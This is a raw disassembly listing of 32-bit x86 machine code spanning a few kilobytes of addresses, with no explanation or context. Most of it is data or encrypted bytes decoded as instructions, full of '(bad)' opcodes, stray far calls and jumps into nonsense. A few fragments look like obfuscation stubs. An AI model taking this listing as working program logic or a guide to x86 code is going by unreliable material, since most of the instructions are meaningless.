  40f22d:	imul   ebp,edx,0xc945d5c
  40f233:	and    BYTE PTR [eax+0x29],dh
  40f236:	xlat   BYTE PTR ds:[ebx]
  40f237:	mov    bh,BYTE PTR [ecx-0x6d8b143]
  40f23d:	pusha  
  40f23e:	sti    
  40f23f:	dec    ebp
  40f240:	mov    ah,0xcc
  40f242:	lods   eax,DWORD PTR ds:[esi]
  40f243:	lds    ebp,FWORD PTR ds:[eax+0x5a]
  40f247:	imul   ebp,DWORD PTR fs:[edx-0x28],0xfffffffb
  40f24c:	add    bh,BYTE PTR [ebx-0x6b938179]
  40f252:	outs   dx,DWORD PTR ds:[esi]
  40f253:	fwait
  40f254:	sbb    BYTE PTR [edi-0x68],bh
  40f257:	hlt    
  40f258:	test   DWORD PTR [ebx],0x831a9b2f
  40f25e:	inc    edx
  40f25f:	test   al,0x1b
  40f261:	push   ds
  40f262:	stc    
  40f263:	outs   dx,BYTE PTR ds:[esi]
  40f264:	fld    DWORD PTR [ebx+ebx*2+0x435c8ec4]
  40f26b:	shl    ah,0xf6
  40f26e:	fbld   TBYTE PTR [eax]
  40f270:	mov    al,0x8c
  40f272:	outs   dx,DWORD PTR ds:[esi]
  40f273:	dec    ebx
  40f274:	xor    DWORD PTR [esi],ebx
  40f276:	rcr    DWORD PTR [ecx+0x669db252],cl
  40f27c:	and    BYTE PTR [esi+ebp*8+0x2f2d85c4],ch
  40f283:	cmp    BYTE PTR [ebx-0x2c3b2e23],ch
  40f289:	jnp    0x40f293
  40f28b:	jmp    0x5af88368
  40f290:	sahf   
  40f291:	mov    ds:0x6552a3d5,eax
  40f296:	icebp  
  40f297:	das    
  40f298:	inc    esi
  40f299:	cdq    
  40f29a:	pop    ecx
  40f29b:	cmp    dh,BYTE PTR [eax]
  40f29d:	push   eax
  40f29e:	push   0x58
  40f2a0:	ds xchg edi,eax
  40f2a2:	push   es
  40f2a3:	and    BYTE PTR [eax+ebx*4+0x295aed4b],dh
  40f2aa:	int    0x15
  40f2ac:	add    al,0xa
  40f2ae:	sbb    DWORD PTR [ebp+ebp*2+0x2a73b312],ecx
  40f2b5:	psrlq  mm6,QWORD PTR [eax-0x6f]
  40f2b9:	mov    ah,0x30
  40f2bb:	jecxz  0x40f2bf
  40f2bd:	mov    cl,0xa0
  40f2bf:	lds    eax,FWORD PTR [ecx-0x30]
  40f2c2:	push   edi
  40f2c3:	lahf   
  40f2c4:	ds mov cl,0x26
  40f2c7:	push   eax
  40f2c8:	pusha  
  40f2c9:	pop    ebp
  40f2ca:	fcmove st,st(4)
  40f2cc:	nop
  40f2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ce:	and    BYTE PTR [edi],0xb0
  40f2d1:	sbb    BYTE PTR [ebx+edi*8-0x75],ah
  40f2d5:	push   esp
  40f2d6:	in     al,0xc9
  40f2d8:	jl     0x40f29b
  40f2da:	xchg   ebp,eax
  40f2db:	call   0xc09b3d48
  40f2e0:	push   ss
  40f2e1:	mov    fs,WORD PTR [eax-0x37]
  40f2e4:	mov    al,ds:0xecb27b53
  40f2e9:	call   0x1584:0xae37e9b3
  40f2f0:	not    DWORD PTR [edi]
  40f2f2:	ret    0x48cd
  40f2f5:	cs in  eax,0xda
  40f2f8:	scas   eax,DWORD PTR es:[edi]
  40f2f9:	inc    ebp
  40f2fa:	push   0xf26823d5
  40f2ff:	pop    esi
  40f300:	fwait
  40f301:	sbb    al,0x99
  40f303:	shr    BYTE PTR [ebx],1
  40f305:	pop    ds
  40f306:	push   edi
  40f307:	out    dx,eax
  40f308:	in     al,dx
  40f309:	mov    WORD PTR [edx],ss
  40f30b:	ror    BYTE PTR [ebx+0x6c],cl
  40f30e:	fmulp  st(1),st
  40f310:	ins    BYTE PTR es:[edi],dx
  40f311:	pop    edx
  40f312:	xchg   edx,eax
  40f313:	shl    ch,cl
  40f315:	into   
  40f316:	fld    TBYTE PTR [esi]
  40f318:	(bad)  
  40f319:	aas    
  40f31a:	ret    0x9d1c
  40f31d:	dec    ebp
  40f31e:	lods   eax,DWORD PTR ds:[esi]
  40f31f:	sub    al,0x95
  40f321:	mov    dh,0x82
  40f323:	cdq    
  40f324:	sbb    al,0xac
  40f326:	mov    esp,0xc4efb4a4
  40f32b:	mov    ecx,0xf7f659b9
  40f330:	ret    0xcd7d
  40f333:	pop    esi
  40f334:	pop    eax
  40f335:	mov    BYTE PTR ds:0x703708d3,bh
  40f33b:	je     0x40f2df
  40f33d:	adc    eax,0xb0c40d51
  40f342:	fs jmp 0xeb9e:0x662fb1d1
  40f34a:	jge    0x40f3af
  40f34c:	daa    
  40f34d:	jmp    0x40f3c1
  40f34f:	push   ebp
  40f350:	adc    DWORD PTR [edx-0x14],edi
  40f353:	mov    ds:0x2a81dc90,al
  40f358:	push   0x6f
  40f35a:	retf   0x5603
  40f35d:	repnz and ebp,esp
  40f360:	ins    BYTE PTR es:[edi],dx
  40f361:	test   al,0xa0
  40f363:	add    al,0x18
  40f365:	pop    edx
  40f366:	mov    cl,0xd8
  40f368:	cli    
  40f369:	std    
  40f36a:	test   eax,0xe26d0c18
  40f36f:	pop    edi
  40f370:	add    bh,al
  40f372:	adc    eax,0xceac465c
  40f377:	cdq    
  40f378:	repz mov bh,0x43
  40f37b:	push   edi
  40f37c:	mov    dh,0x79
  40f37e:	inc    eax
  40f37f:	sub    bh,BYTE PTR [eax+0x3fb9a3fe]
  40f385:	sbb    eax,0xe72fff64
  40f38a:	xor    DWORD PTR [ecx],esp
  40f38c:	test   al,0xc3
  40f38e:	mov    cl,0x98
  40f390:	push   cs
  40f391:	(bad)  
  40f392:	(bad)  
  40f393:	icebp  
  40f394:	mov    ds:0x8439ae1e,al
  40f399:	jp     0x40f3e5
  40f39b:	mov    ah,0x9a
  40f39d:	rol    DWORD PTR [edi-0x7c],cl
  40f3a0:	lock es enter 0xb70d,0x10
  40f3a6:	xlat   BYTE PTR ds:[ebx]
  40f3a7:	pop    ebx
  40f3a8:	(bad)  
  40f3a9:	and    al,0x59
  40f3ab:	sbb    ecx,ebx
  40f3ad:	mov    WORD PTR [edi+0x62],gs
  40f3b0:	jle    0x40f3b8
  40f3b2:	lds    edx,FWORD PTR ds:[edx+0x32db7909]
  40f3b9:	call   0x61d4dceb
  40f3be:	repnz leave 
  40f3c0:	(bad)  
  40f3c1:	lods   al,BYTE PTR ds:[esi]
  40f3c2:	lods   eax,DWORD PTR ds:[si]
  40f3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3c5:	jecxz  0x40f388
  40f3c7:	jns    0x40f417
  40f3c9:	rcl    BYTE PTR [eax-0x243bd33b],1
  40f3cf:	push   ss
  40f3d0:	lock mov ds:0x1821a377,al
  40f3d6:	push   ebx
  40f3d7:	sahf   
  40f3d8:	rol    DWORD PTR [edi+eax*1-0x79170619],0xfd
  40f3e0:	das    
  40f3e1:	std    
  40f3e2:	mov    ch,0xc3
  40f3e4:	repnz and eax,0x5642ae60
  40f3ea:	dec    ebx
  40f3eb:	ins    BYTE PTR es:[edi],dx
  40f3ec:	icebp  
  40f3ed:	mov    ch,0xc8
  40f3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3f0:	mov    al,ds:0x9f11dce9
  40f3f5:	mov    ?,ebx
  40f3f7:	cli    
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	lods   al,BYTE PTR ds:[esi]
  40f42a:	std    
  40f42b:	pop    ss
  40f42c:	shr    BYTE PTR [edi-0x53818155],0x7c
  40f433:	jle    0x40f4b3
  40f435:	xlat   BYTE PTR ds:[ebx]
  40f436:	inc    eax
  40f437:	adc    esp,edx
  40f439:	std    
  40f43a:	push   0xffffffc3
  40f43c:	dec    ebx
  40f43d:	test   BYTE PTR [ebp-0x55],dh
  40f440:	or     DWORD PTR [edx+0x7d],esp
  40f443:	push   ebx
  40f444:	das    
  40f445:	jb     0x40f45e
  40f447:	outs   dx,DWORD PTR ds:[esi]
  40f448:	stos   BYTE PTR es:[edi],al
  40f449:	jnp    0x40f40a
  40f44b:	jle    0x40f4aa
  40f44d:	mov    bh,0x84
  40f44f:	loopne 0x40f3d4
  40f451:	mov    esp,DWORD PTR [ecx-0x27]
  40f454:	or     DWORD PTR ds:0xf086a2e6,eax
  40f45a:	or     esp,ebp
  40f45c:	repz div DWORD PTR [eax+0x23]
  40f460:	sbb    bh,BYTE PTR [eax]
  40f462:	pop    eax
  40f463:	je     0x40f3f4
  40f465:	or     BYTE PTR [edi+0x75],dh
  40f468:	enter  0xd37d,0x34
  40f46c:	ret    
  40f46d:	sbb    eax,0x57474b25
  40f472:	fs inc ebx
  40f474:	addr16 or al,0x17
  40f477:	pop    ebp
  40f478:	neg    DWORD PTR [ecx-0x3d]
  40f47b:	ficomp WORD PTR ds:0xb80a67ad
  40f481:	arpl   dx,si
  40f483:	fdivr  QWORD PTR [eax+0xeda822e]
  40f489:	test   eax,0x53f866c1
  40f48e:	in     al,dx
  40f48f:	les    eax,FWORD PTR [esi+0x2a]
  40f492:	fcomp  QWORD PTR [esi-0x6]
  40f495:	pop    esi
  40f496:	inc    ebp
  40f497:	repz adc al,0xdd
  40f49a:	ja     0x40f494
  40f49c:	mov    ebx,0x7df4cba9
  40f4a1:	xor    al,0x59
  40f4a3:	adc    eax,0x74a3a973
  40f4a8:	retf   0x2005
  40f4ab:	std    
  40f4ac:	pop    ss
  40f4ad:	push   edi
  40f4ae:	hlt    
  40f4af:	dec    eax
  40f4b0:	mov    ecx,0x5b507e11
  40f4b5:	jne    0x40f467
  40f4b7:	mov    ?,WORD PTR [edx+0x58]
  40f4ba:	or     eax,0x2b4288b9
  40f4bf:	out    dx,al
  40f4c0:	aaa    
  40f4c1:	xor    BYTE PTR [eax],ch
  40f4c3:	inc    edx
  40f4c4:	xchg   esi,eax
  40f4c5:	push   esp
  40f4c6:	cs dec esp
  40f4c8:	mov    cl,0xda
  40f4ca:	push   ss
  40f4cb:	dec    ebx
  40f4cc:	mov    bl,0xb4
  40f4ce:	rcl    DWORD PTR [edx-0x3182f0dc],0x43
  40f4d5:	fnsave [ecx-0x4b40c91f]
  40f4db:	loopne 0x40f4db
  40f4dd:	xchg   DWORD PTR [edx-0x76bb2842],edi
  40f4e3:	jge    0x40f4cf
  40f4e5:	and    DWORD PTR ds:0xf8ca3895,ebx
  40f4eb:	jns    0x40f4d3
  40f4ed:	je     0x40f4bf
  40f4ef:	jge    0x40f4ea
  40f4f1:	mov    bh,0x63
  40f4f3:	inc    cl
  40f4f5:	add    al,0x76
  40f4f7:	and    dh,BYTE PTR ds:0xf94be933
  40f4fd:	repnz bound ebp,QWORD PTR [ebx-0x6f]
  40f501:	sbb    ecx,eax
  40f503:	and    BYTE PTR [eax],0xf3
  40f506:	add    ebx,DWORD PTR [ebx]
  40f508:	mov    ah,BYTE PTR [eax-0x9]
  40f50b:	mov    esi,0x261ba6da
  40f510:	push   ebx
  40f511:	inc    ecx
  40f512:	fidivr DWORD PTR [ebx+eax*4+0x30]
  40f516:	(bad)  
  40f517:	fidiv  DWORD PTR [esi]
  40f519:	sub    cl,BYTE PTR [ebx-0x1065c183]
  40f51f:	jo     0x40f512
  40f521:	mov    al,0x77
  40f523:	imul   bh
  40f525:	retf   0x3a12
  40f528:	popa   
  40f529:	retf   0xee65
  40f52c:	imul   ebp,DWORD PTR [ebx+eax*4+0x5d],0xffffffbc
  40f531:	(bad)  
  40f532:	out    0x6e,eax
  40f534:	adc    BYTE PTR [ebx+0x4e],al
  40f537:	sbb    al,0x6a
  40f539:	mov    al,0xe8
  40f53b:	fdivr  DWORD PTR [edi+0x585d4645]
  40f541:	sbb    BYTE PTR [eax+0x77f0357f],dl
  40f547:	inc    ecx
  40f548:	jecxz  0x40f539
  40f54a:	ins    BYTE PTR es:[edi],dx
  40f54b:	bound  esp,QWORD PTR [edi-0x5cf53c0f]
  40f551:	aam    0xda
  40f553:	xchg   edx,eax
  40f554:	mov    eax,ds:0xf3cfc84b
  40f559:	ficom  DWORD PTR [eax]
  40f55b:	jo     0x40f59f
  40f55d:	mov    ah,0xbc
  40f55f:	xchg   BYTE PTR [esi],bh
  40f561:	in     eax,dx
  40f562:	(bad)  
  40f564:	das    
  40f565:	and    al,0x8
  40f567:	enter  0x7f2e,0x8c
  40f56b:	and    DWORD PTR [ebp+0x8],esp
  40f56e:	cld    
  40f56f:	loop   0x40f5e9
  40f571:	outs   dx,BYTE PTR ds:[esi]
  40f572:	scas   eax,DWORD PTR es:[edi]
  40f573:	jae    0x40f5a8
  40f575:	fistp  WORD PTR [ecx+0x117e0644]
  40f57b:	mov    ebx,0xe472b27f
  40f580:	pop    esp
  40f581:	pop    eax
  40f582:	pop    es
  40f583:	mov    BYTE PTR [edi-0x33],dl
  40f586:	aas    
  40f587:	aam    0xd4
  40f589:	jge    0x40f573
  40f58b:	mov    dh,0xc9
  40f58d:	cmp    DWORD PTR [ebp+0x50075d2c],ebp
  40f593:	or     edi,DWORD PTR [edi]
  40f595:	das    
  40f596:	xor    dh,bh
  40f598:	push   esp
  40f599:	in     eax,0x4f
  40f59b:	jp     0x40f54e
  40f59d:	ins    DWORD PTR es:[edi],dx
  40f59e:	jbe    0x40f57b
  40f5a0:	xchg   esi,eax
  40f5a1:	test   BYTE PTR [edx+0x33],ch
  40f5a4:	jecxz  0x40f615
  40f5a6:	add    eax,0x6cdb91c6
  40f5ab:	(bad)  
  40f5ac:	popa   
  40f5ad:	add    DWORD PTR [eax],edi
  40f5af:	adc    al,0xeb
  40f5b1:	and    esp,DWORD PTR [eax]
  40f5b3:	ret    0xaf31
  40f5b6:	sti    
  40f5b7:	js     0x40f578
  40f5b9:	pop    es
  40f5ba:	in     al,dx
  40f5bb:	mov    eax,ds:0x5869650a
  40f5c0:	sar    BYTE PTR [eax],1
  40f5c2:	and    ah,BYTE PTR ds:0x11b83ac7
  40f5c8:	mov    ds:0xe7d7a143,al
  40f5cd:	dec    esi
  40f5ce:	call   0x1bbcb781
  40f5d3:	or     ebp,esp
  40f5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5d6:	je     0x40f610
  40f5d8:	fwait
  40f5d9:	test   BYTE PTR [edi-0x35],0x5c
  40f5dd:	retf   0x1057
  40f5e0:	jecxz  0x40f580
  40f5e2:	push   0x2f
  40f5e4:	(bad)  
  40f5e5:	ja     0x40f598
  40f5e7:	sub    ah,ch
  40f5e9:	cdq    
  40f5ea:	je     0x40f637
  40f5ec:	jnp    0x40f668
  40f5ee:	(bad)  
  40f5ef:	repnz mov ch,0x51
  40f5f2:	mov    esi,0xf433c155
  40f5f7:	cmp    eax,0xa4f6fd82
  40f5fc:	dec    eax
  40f5fd:	push   0x9be77e56
  40f602:	adc    eax,0x56c50c9d
  40f607:	inc    esi
  40f608:	mov    edi,eax
  40f60a:	add    DWORD PTR [ebx],0x4bdb68f8
  40f610:	push   eax
  40f611:	cwde   
  40f612:	xchg   edx,eax
  40f613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f614:	adc    BYTE PTR [eax],0x2e
  40f617:	and    al,0x33
  40f619:	lock xchg edi,eax
  40f61b:	and    eax,DWORD PTR ds:0x405c3517
  40f621:	fs stos DWORD PTR es:[edi],eax
  40f623:	daa    
  40f624:	push   edi
  40f625:	cmp    al,0x38
  40f627:	xor    eax,0xade9829d
  40f62c:	and    BYTE PTR [esi+0x52f0333b],ah
  40f632:	jno    0x40f621
  40f634:	and    ebx,DWORD PTR [esi]
  40f636:	into   
  40f637:	cmp    BYTE PTR ds:0x953648ad,dh
  40f63d:	scas   eax,DWORD PTR es:[edi]
  40f63e:	fs cld 
  40f640:	mov    eax,?
  40f642:	jne    0x40f62d
  40f644:	xchg   ebp,eax
  40f645:	sub    al,0xc6
  40f647:	(bad)
  40f64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f64c:	cmp    dh,BYTE PTR [esi+0x1f5be19a]
  40f652:	xor    DWORD PTR ds:0x6c846ae0,ecx
  40f658:	dec    eax
  40f659:	stos   DWORD PTR es:[edi],eax
  40f65a:	popa   
  40f65b:	fwait
  40f65c:	imul   ecx,DWORD PTR [ecx*8+0x10427105],0x8ff06d44
  40f667:	gs sbb dh,ch
  40f66a:	xchg   BYTE PTR [edi-0x6c8685b9],al
  40f670:	sub    DWORD PTR [esi],esp
  40f672:	in     eax,dx
  40f673:	xchg   DWORD PTR [ecx+0x60dbdb26],edi
  40f679:	xor    DWORD PTR [ecx-0x1a],eax
  40f67c:	pop    edx
  40f67d:	in     eax,dx
  40f67e:	or     al,0x4f
  40f680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f681:	xchg   ebx,eax
  40f682:	stos   DWORD PTR es:[edi],eax
  40f683:	outs   dx,DWORD PTR ds:[esi]
  40f684:	and    esi,0x904c19fa
  40f68a:	pop    edx
  40f68b:	push   0x8725cab5
  40f690:	mov    ds:0xb22a7750,eax
  40f695:	stc    
  40f696:	pop    esi
  40f697:	mov    ds:0xa88dc9aa,eax
  40f69c:	div    BYTE PTR [edi+0x6d1f9204]
  40f6a2:	cmp    BYTE PTR ds:0x996d98a2,0xa0
  40f6a9:	jno    0x40f6cb
  40f6ab:	shl    BYTE PTR [esi+ebx*8],0xb2
  40f6af:	push   edi
  40f6b0:	ds retf 
  40f6b2:	push   edi
  40f6b3:	pop    ss
  40f6b4:	shl    BYTE PTR [edx+0x21],cl
  40f6b7:	push   ebp
  40f6b8:	sbb    ecx,ecx
  40f6ba:	inc    ecx
  40f6bb:	popa   
  40f6bc:	add    ebx,DWORD PTR [eax+0xc]
  40f6bf:	jp     0x40f6f0
  40f6c1:	jb     0x40f73f
  40f6c3:	rcr    BYTE PTR [ebx+0x59],cl
  40f6c6:	shl    edi,1
  40f6c8:	jmp    0xc527:0x20844d82
  40f6cf:	pushf  
  40f6d0:	mov    dl,0x7e
  40f6d2:	std    
  40f6d3:	jns    0x40f6c4
  40f6d5:	adc    bl,BYTE PTR es:[si-0x79a5]
  40f6db:	mov    ebx,0xc7496f0b
  40f6e0:	jbe    0x40f6ba
  40f6e2:	push   0x2a4ff1c6
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433827,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	cwde   
  40f717:	xor    BYTE PTR [ebp+0x7eb6dd89],ah
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6e8
  40f723:	repz and DWORD PTR [edx+0x5c],edx
  40f727:	sub    eax,0x3f2a1188
  40f72c:	das    
  40f72d:	loop   0x40f741
  40f72f:	mov    esi,0x4b950e6f
  40f734:	icebp  
  40f735:	mov    edx,0x4b0dd7e
  40f73a:	scas   al,BYTE PTR es:[edi]
  40f73b:	dec    esi
  40f73c:	rcr    al,1
  40f73e:	jbe    0x40f749
  40f740:	xchg   ecx,eax
  40f741:	das    
  40f742:	(bad)  [ecx+0x66]
  40f745:	jmp    FWORD PTR [edx+0x7a140304]
  40f74b:	mov    eax,0x29eb8732
  40f750:	push   esi
  40f751:	push   0x10
  40f753:	test   BYTE PTR [edi+0x3f7e19d2],bl
  40f759:	arpl   WORD PTR [eax+0x7e6b08c5],bp
  40f75f:	ror    BYTE PTR [eax-0x5e],cl
  40f762:	push   cs
  40f763:	dec    ecx
  40f764:	sub    al,0x4
  40f766:	icebp  
  40f767:	sub    eax,eax
  40f769:	pop    esi
  40f76a:	clc    
  40f76b:	cwde   
  40f76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f76d:	mov    bl,0x87
  40f76f:	fidivr WORD PTR [ecx-0x51b90dcf]
  40f775:	cmp    edx,edx
  40f777:	call   0xd58944d1
  40f77c:	iret   
  40f77d:	ss fdivp st(4),st
  40f780:	pop    ecx
  40f781:	(bad)  
  40f783:	push   esi
  40f784:	lds    esp,FWORD PTR [eax+0x68108511]
  40f78a:	mov    bh,0x8f
  40f78c:	cmp    DWORD PTR [edi],edx
  40f78e:	xor    cl,BYTE PTR [eax]
  40f790:	fidiv  DWORD PTR [edx+0x571076b0]
  40f796:	xor    BYTE PTR [eax],ch
  40f798:	jg     0x40f7a3
  40f79a:	push   ss
  40f79b:	xor    ebx,DWORD PTR [eax+0x32fe5a5b]
  40f7a1:	das    
  40f7a2:	jns    0x40f748
  40f7a4:	retf   
  40f7a5:	cli    
  40f7a6:	mov    ebx,0x1fa1b01c
  40f7ab:	mov    eax,gs:0xe92670b2
  40f7b1:	and    eax,0x1503d131
  40f7b6:	lock (bad) 
  40f7b9:	cmc    
  40f7ba:	(bad)  
  40f7bb:	push   ecx
  40f7bc:	or     al,0x34
  40f7be:	push   eax
  40f7bf:	ins    BYTE PTR es:[edi],dx
  40f7c0:	jae    0x40f790
  40f7c2:	jo     0x40f7e8
  40f7c4:	cmp    BYTE PTR ds:0x2d2279c7,al
  40f7ca:	pop    ebp
  40f7cb:	sub    al,0x45
  40f7cd:	pop    esp
  40f7ce:	adc    BYTE PTR [ecx+eax*8-0x4b],bl
  40f7d2:	mov    ch,0x9f
  40f7d4:	xchg   esi,eax
  40f7d5:	leave  
  40f7d6:	call   0x8e92:0x40b84e6f
  40f7dd:	mov    dl,0x74
  40f7df:	pop    esp
  40f7e0:	aaa    
  40f7e1:	jne    0x40f798
  40f7e3:	dec    ebp
  40f7e4:	cmp    ah,BYTE PTR [edi+0x41431290]
  40f7ea:	dec    ecx
  40f7eb:	dec    ebx
  40f7ec:	and    ah,dh
  40f7ee:	adc    al,0x2
  40f7f0:	ffree  st(3)
  40f7f2:	not    ebp
  40f7f4:	std    
  40f7f5:	icebp  
  40f7f6:	dec    eax
  40f7f7:	rol    BYTE PTR [esi],1
  40f7f9:	fimul  DWORD PTR [edx+0x56]
  40f7fc:	ins    DWORD PTR es:[edi],dx
  40f7fd:	hlt    
  40f7fe:	jle    0x40f80c
  40f800:	push   edx
  40f801:	inc    esi
  40f802:	pop    es
  40f803:	push   esi
  40f804:	xor    bl,BYTE PTR [esi-0x9452c4c]
  40f80a:	dec    ebx
  40f80b:	cwde   
  40f80c:	adc    al,0x9a
  40f80e:	repz lock ret 
  40f811:	int3   
  40f812:	sub    eax,0x4f4de34e
  40f817:	mov    al,ds:0x3f4481e1
  40f81c:	add    al,0x65
  40f81e:	inc    edi
  40f81f:	cld    
  40f820:	sbb    eax,0x614d31ce
  40f825:	aaa    
  40f826:	mov    esi,0xe69f5266
  40f82b:	add    ah,BYTE PTR [ebx-0x3d]
  40f82e:	stc    
  40f82f:	sbb    ch,al
  40f831:	push   ebp
  40f832:	sbb    BYTE PTR [ebp+0x5ac23041],dl
  40f838:	jbe    0x40f88c
  40f83a:	pop    es
  40f83b:	not    DWORD PTR [ebx+0x5]
  40f83e:	mov    edi,0x80875e5
  40f843:	in     al,dx
  40f844:	jg     0x40f84e
  40f846:	bound  esi,QWORD PTR [edx+eiz*1-0x63]
  40f84a:	sub    bh,BYTE PTR [ebp+ebp*4-0x6c]
  40f84e:	pusha  
  40f84f:	fld    TBYTE PTR [esi]
  40f851:	retf   
  40f852:	sar    DWORD PTR [eax-0xfef6755],1
  40f858:	fisub  DWORD PTR [edi+0x58]
  40f85b:	adc    DWORD PTR [edi-0xf4f1737],ebx
  40f861:	out    0x7a,al
  40f863:	mov    edx,0xdcafedb4
  40f868:	jle    0x40f803
  40f86a:	test   BYTE PTR [esi],dh
  40f86c:	mov    WORD PTR [edi-0x3c4f9d50],gs
  40f872:	jge    0x40f84a
  40f874:	lock or al,0x8
  40f877:	test   eax,0xcf33477d
  40f87c:	add    DWORD PTR cs:[ebp+0x2e],eax
  40f880:	or     al,0xd
  40f882:	aas    
  40f883:	mov    dl,0x19
  40f885:	push   ds
  40f886:	sbb    eax,DWORD PTR [edi+0x68]
  40f889:	addr16 out 0x53,al
  40f88c:	popa   
  40f88d:	add    al,BYTE PTR [ecx-0x27]
  40f890:	xchg   ecx,eax
  40f891:	pushf  
  40f892:	mov    bh,0x2d
  40f894:	xchg   ecx,eax
  40f895:	mov    edx,0xb0b25671
  40f89a:	test   DWORD PTR [ebp+esi*2-0x2702fe2c],esp
  40f8a1:	mov    eax,0x4926a79e
  40f8a6:	adc    ecx,DWORD PTR [ebx-0x20]
  40f8a9:	or     BYTE PTR [ebx-0x3f],bl
  40f8ac:	cmp    DWORD PTR [esi-0x5189ba82],0xffffff81
  40f8b3:	ror    DWORD PTR [ebp+0x43feded6],cl
  40f8b9:	addr16 jb 0x40f900
  40f8bc:	test   eax,0x807ebb79
  40f8c1:	jb     0x40f89a
  40f8c3:	int    0x98
  40f8c5:	mov    ch,0x44
  40f8c7:	dec    ebx
  40f8c8:	repz and eax,0x26022c53
  40f8ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8cf:	mov    bh,0xb8
  40f8d1:	mov    edi,0xd958f695
  40f8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8d7:	cld    
  40f8d8:	stos   BYTE PTR es:[edi],al
  40f8d9:	clc    
  40f8da:	sbb    eax,0x3f636647
  40f8df:	adc    BYTE PTR [esi+0x5f806be6],ch
  40f8e5:	pop    es
  40f8e6:	inc    ecx
  40f8e7:	(bad)
  40f8ea:	pusha  
  40f8eb:	push   0xffffffad
  40f8ed:	sbb    al,0xef
  40f8ef:	(bad)  
  40f8f0:	js     0x40f90d
  40f8f2:	xor    esi,DWORD PTR gs:[ecx+0x63e5968c]
  40f8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8fa:	or     al,0xdd
  40f8fc:	mov    bh,0xc8
  40f8fe:	in     al,dx
  40f8ff:	mov    bh,0x56
  40f901:	imul   eax,edx,0x796bf6ed
  40f907:	sbb    BYTE PTR [edx-0x56],0xf1
  40f90b:	jbe    0x40f98c
  40f90d:	cmp    edx,DWORD PTR [esi-0x61]
  40f910:	dec    eax
  40f911:	into   
  40f912:	mov    ah,0x66
  40f914:	jb     0x40f90a
  40f916:	imul   edx,DWORD PTR [esi],0x4d878f45
  40f91c:	pop    ds
  40f91d:	outs   dx,DWORD PTR ds:[esi]
  40f91e:	xor    DWORD PTR [eax],ebp
  40f920:	and    al,0x9a
  40f922:	jg     0x40f8cd
  40f924:	dec    ebp
  40f925:	in     al,0x44
  40f927:	jecxz  0x40f95b
  40f929:	pop    ebx
  40f92a:	xchg   esi,eax
  40f92b:	lods   al,BYTE PTR ds:[esi]
  40f92c:	fist   DWORD PTR [eax]
  40f92e:	adc    BYTE PTR [edi+0x44ff5e2d],cl
  40f934:	push   esi
  40f935:	push   eax
  40f936:	pop    ecx
  40f937:	outs   dx,BYTE PTR ds:[esi]
  40f938:	je     0x40f8e6
  40f93a:	retf   
  40f93b:	call   0x1ff:0x86172da2
  40f942:	jge    0x40f986
  40f944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f945:	jne    0x40f973
  40f947:	sbb    al,0x1
  40f949:	push   edi
  40f94a:	cwde   
  40f94b:	fild   QWORD PTR [esi+0x7f]
  40f94e:	sub    ah,BYTE PTR [ebx]
  40f950:	lods   eax,DWORD PTR ds:[esi]
  40f951:	(bad)  [eax+0x1647fe03]
  40f957:	repnz fcmovu st,st(6)
  40f95a:	pop    edi
  40f95b:	sub    eax,0x9778385b
  40f960:	jp     0x40f9b6
  40f962:	es jbe 0x40f977
  40f965:	mov    DWORD PTR [edi],ebx
  40f967:	xor    eax,0xbf005d7e
  40f96c:	xor    ebx,DWORD PTR [ebx-0x1]
  40f96f:	ret    
  40f970:	mov    esp,0x204a85f
  40f975:	stos   BYTE PTR es:[edi],al
  40f976:	mov    esp,0x170e8888
  40f97b:	jge    0x40f91d
  40f97d:	mov    dh,0x2d
  40f97f:	shl    DWORD PTR [ebp-0x703ce1ba],cl
  40f985:	out    dx,al
  40f986:	xor    eax,0x7cd676a3
  40f98b:	xchg   esp,eax
  40f98c:	outs   dx,DWORD PTR ds:[esi]
  40f98d:	fsubr  QWORD PTR [ebp+0x49]
  40f990:	and    esp,DWORD PTR [ecx+0x76cccf29]
  40f996:	mov    WORD PTR [ecx+0x18],fs
  40f999:	lods   eax,DWORD PTR ds:[esi]
  40f99a:	out    0x3a,al
  40f99c:	das    
  40f99d:	por    mm2,QWORD PTR [ebp-0x4a]
  40f9a1:	dec    edi
  40f9a2:	dec    ebp
  40f9a3:	gs int3 
  40f9a5:	push   esi
  40f9a6:	push   ss
  40f9a7:	or     BYTE PTR [eax+0x37],ah
  40f9aa:	sub    dl,BYTE PTR [ebp-0x3d3fe367]
  40f9b0:	cmp    DWORD PTR [ebp-0x39a57c7a],ebp
  40f9b6:	sahf   
  40f9b7:	mov    ch,0x92
  40f9b9:	add    edx,DWORD PTR [edx+0x35]
